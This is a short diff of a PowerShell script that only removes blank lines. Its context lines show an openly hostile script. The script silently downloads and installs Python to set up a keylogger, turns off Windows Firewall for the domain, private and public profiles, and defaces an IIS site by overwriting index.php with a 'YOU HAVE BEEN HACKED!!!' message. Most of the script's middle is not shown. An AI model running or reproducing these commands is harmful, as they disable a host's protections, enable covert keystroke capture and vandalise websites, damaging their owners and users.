@@ -1,4 +1,3 @@
-
 # install python and python keylogger
 Invoke-WebRequest https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe -OutFile python-installer.exe
 Start-Process python-installer.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
@@ -30,5 +29,3 @@ Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
 
 # deface website
 echo "YOU HAVE BEEN HACKED!!!" > "C:\inetpub\wwwroot\index.php"
-
-
